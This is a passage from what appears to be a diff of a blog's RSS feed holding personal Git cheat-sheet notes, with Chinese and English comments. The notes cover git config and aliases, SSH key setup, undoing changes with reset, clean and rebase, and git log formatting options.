+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="merge-base">merge-base&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>git merge-base origin/master HEAD
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Git Config</title><link>/note/ops/vcs/git-config/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/ops/vcs/git-config/</guid><description>
+&lt;h2 id="config">config&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>git &lt;span style="color:#204a87">help&lt;/span> config
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>man git-config
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --list
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 提交时转换为LF，检出时转换为CRLF&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --global core.autocrlf &lt;span style="color:#204a87">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 提交时转换为LF，检出时不转换&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --global core.autocrlf input
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 提交检出均不转换&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --global core.autocrlf &lt;span style="color:#204a87">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 拒绝提交包含混合换行符的文件&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --global core.safecrlf &lt;span style="color:#204a87">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 允许提交包含混合换行符的文件&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --global core.safecrlf &lt;span style="color:#204a87">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 提交包含混合换行符的文件时给出警告&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --global core.safecrlf warn
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --global alias.co checkout
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --global alias.br branch
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --global alias.ci commit
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --global alias.s status
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --global alias.unstage &lt;span style="color:#4e9a06">&amp;#39;reset HEAD - &amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --global alias.last &lt;span style="color:#4e9a06">&amp;#39;log -1 HEAD&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># git config --global alias.l &amp;#39;!ls -lah&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --global alias.url &lt;span style="color:#4e9a06">&amp;#39;remote get-url --all origin&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># git config --global core.editor &amp;#34;&amp;#39;C:/Options/Notepad++/notepad++.exe&amp;#39; -multiInst -nosession&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --global core.editor vim
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="gitconfig">&lt;code>.gitconfig&lt;/code>&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">[user]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#c4a000">name&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">yourname
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06"> email = youremail&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">[http]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">#proxy = socks5://127.0.0.1:1080&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">[https]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">#proxy = socks5://127.0.0.1:1080 &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">[core]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#c4a000">autocrlf&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">input
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06"> safecrlf = true&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">[alias]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#c4a000">co&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">checkout
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06"> br = branch
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06"> ci = commit
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06"> s = statcus
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06"> last = log -1 HEAD
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06"> lg = log --graph
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06"> url = remote get-url --all origin &lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="sshconfig">&lt;code>.ssh/config&lt;/code>&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>ssh-keygen -t rsa -b &lt;span style="color:#0000cf;font-weight:bold">4096&lt;/span> -C &lt;span style="color:#4e9a06">&amp;#34;youremail&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code class="language-conf" data-lang="conf">host *
+AddKeysToAgent yes
+UseKeychain yes
+TCPKeepAlive yes
+ServerAliveInterval 60
+ServerAliveCountMax 5
+host github.com
+user git
+hostname github.com
+port 22
+identityfile ~/.ssh/id_rsa
+&lt;/code>&lt;/pre></description></item><item><title>Note: Git How-To</title><link>/note/ops/vcs/git-how-to/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/ops/vcs/git-how-to/</guid><description>
+&lt;h2 id="undo-untracked">undo &lt;code>untracked&lt;/code>&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>git reset --hard &amp;lt;commit_id&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># show which will be removed, include untracked directories&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># -n --dry-run， Don&amp;#39;t actually remove anything&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git clean -d -n
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># delete anyway, no confirm&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git clean -d -f
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="undo-not-staged-change-removal-or-modification">undo &lt;code>not staged change&lt;/code> (removal or modification)&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># in stage space but changed by external&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># touch a &amp;amp;&amp;amp; gti add a &amp;amp;&amp;amp; rm a, then a has not staged changes&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># discard changes in working directory&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git restore &amp;lt;files&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># or&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git checkout &amp;lt;files&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># update what will be committed&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git add &amp;lt;files&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># caused by removal&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git rm &amp;lt;files&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># or&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git rm --cached &amp;lt;files&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="undo-add">undo &lt;code>add&lt;/code>&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># undo stage&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git restore --staged &amp;lt;files&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># remove from staged space&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git rm --cached d
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="undo-commit">undo &lt;code>commit&lt;/code>&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># message&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git commit --amend -m &lt;span style="color:#4e9a06">&amp;#39;message which will cover the old one&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># undo commit, but not undo add&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --soft, do not touch the index file nor the working tree&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --hard, match the working tree and index to the given tree&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --mixed, reset the index but not the working tree (default)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git reset --soft HEAD^
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># undo &amp;lt;n&amp;gt; commits&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git reset --soft HEAD~n
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="merge-commit">merge commit&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># reapply n commits&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git rebase -i HEAD~n
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># pick&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># squash&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># ...&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># squash&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git add .
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git rebase --continue
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># git rebase --abort&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git push --force
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="delete-the-last-commit">delete the last commit&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># where git interprets x^ as the parent of x &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># + as a forced non-fastforward push. &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git push master +&amp;lt;second-last-commit&amp;gt;^:master
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># or&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git reset HEAD^ --hard
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git push master -f
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="delete-the-second-last-commit">delete the second last commit&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># this will open an editor and show a list of all commits since the commit we want to get rid of&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># simply remove the line with the offending commit, likely that will be the first line&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git rebase -i &amp;lt;second-last-commit&amp;gt;^
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git push master -f
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Git Log</title><link>/note/ops/vcs/git-log/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/ops/vcs/git-log/</guid><description>
+&lt;h2 id="status">status&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>git init --bare /path/to/repo/.git
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># git remote add origin /path/to/repo/.git&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git clone /path/to/repo
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 显示工作目录和当前HEAD提交之间存在差异的路径&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git status
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --short&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># A added.c&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># M modified.cc&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># R renamed.h&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># D deleted.hh&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git status -s
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="diff">diff&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 将工作目录中的内容与暂存区域中的内容进行比较&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git diff
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --cached，将暂存更改与上次提交进行比较 &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git diff --staged
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git diff oldCommit..newCommit
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="log">log&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 按反向时间顺序列出在该存储库中进行的提交&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git log
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># -p，patch 显示每次提交中引入的差异（补丁输出）&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># -2 仅显示最后两个条目&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --stat 在每个提交条目下方打印一个已修改文件的列表，已更改的文件数以及这些文件中添加和删除的行数&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --shortstat 仅显示--stat命令中已更改/插入/删除行。&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --pretty=oneline 在一行上打印每个提交&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git log --pretty&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>oneline
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 短哈希 - 作者名，日期 ：注释&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git log --pretty&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>format:&lt;span style="color:#4e9a06">&amp;#34;%h - %an, %ar : %s&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --graph 添加一个很好的小ASCII图，显示您的分支和合并历史记录&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git log --pretty&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>format:&lt;span style="color:#4e9a06">&amp;#34;%h %s&amp;#34;&lt;/span> --graph
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git log -&amp;lt;n&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --since, --after&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --until, --before&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git log --since&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>2.weeks
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git log --since&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;2008-01-15&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git log --since&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;2 years 1 day 3 minutes ago&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --committer 执行提交的用户&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --author 作出修改的用户&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 在提交消息中搜索关键字&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git --author&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&amp;lt;author&amp;gt; --grep&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;keyword&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 可以指定--author和--grep搜索条件的多个实例&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 这将限制提交输出到与任何--author模式和任何--grep模式匹配的提交&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --all-match 会进一步将输出限制为与所有--grep模式匹配的提交&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 仅显示提交添加或删除与字符串匹配的代码的提交&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git log -S function_name
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="useful-options-for-git-log---prettyformat">Useful options for &lt;code>git log --pretty=format&lt;/code>&lt;/h3>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Option&lt;/th>
+&lt;th>Description of Output&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>&lt;code>%H&lt;/code>&lt;/td>
+&lt;td>Commit hash&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>%h&lt;/code>&lt;/td>
+&lt;td>Abbreviated commit hash&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>%T&lt;/code>&lt;/td>
+&lt;td>Tree hash&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>%t&lt;/code>&lt;/td>
+&lt;td>Abbreviated tree hash&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>%P&lt;/code>&lt;/td>
+&lt;td>Parent hashes&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>%p&lt;/code>&lt;/td>
+&lt;td>Abbreviated parent hashes&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>%an&lt;/code>&lt;/td>
+&lt;td>Author name&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>%ae&lt;/code>&lt;/td>
+&lt;td>Author email&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>%ad&lt;/code>&lt;/td>
+&lt;td>Author date (format respects the &amp;ndash;date=option)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>%ar&lt;/code>&lt;/td>
+&lt;td>Author date, relative&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>%cn&lt;/code>&lt;/td>
+&lt;td>Committer name&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>%ce&lt;/code>&lt;/td>
+&lt;td>Committer email&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>%cd&lt;/code>&lt;/td>
+&lt;td>Committer date&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>%cr&lt;/code>&lt;/td>
+&lt;td>Committer date, relative&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>%s&lt;/code>&lt;/td>
+&lt;td>Subject&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table></description></item><item><title>Note: Git Rebase</title><link>/note/ops/vcs/git-rebase/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/ops/vcs/git-rebase/</guid><description>
+&lt;h2 id="rebase">rebase&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># Assume the following history exists and the current branch is &amp;#34;topic&amp;#34;:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># A - B - C topic&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># / &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># D - E - F -G master&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git switch topic
